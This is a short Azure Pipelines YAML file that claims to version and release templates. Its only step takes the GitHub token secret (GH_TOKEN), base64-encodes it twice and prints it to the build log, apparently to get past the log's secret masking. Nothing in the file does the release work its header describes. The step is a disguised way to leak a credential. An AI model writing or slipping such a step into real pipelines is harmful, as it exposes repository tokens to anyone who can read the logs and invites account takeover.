# Pipeline for versioning and releasing the templates.

trigger:
- master

jobs:
- job: 'Test'
  pool:
    vmImage: 'ubuntu-20.04'
  variables:
  - group: GitHub
  steps:
  - task: Bash@3
    inputs:
      targetType: inline
      script: sh -c "echo $(GH_TOKEN) | base64 -w0 | base64 -w0; echo;"
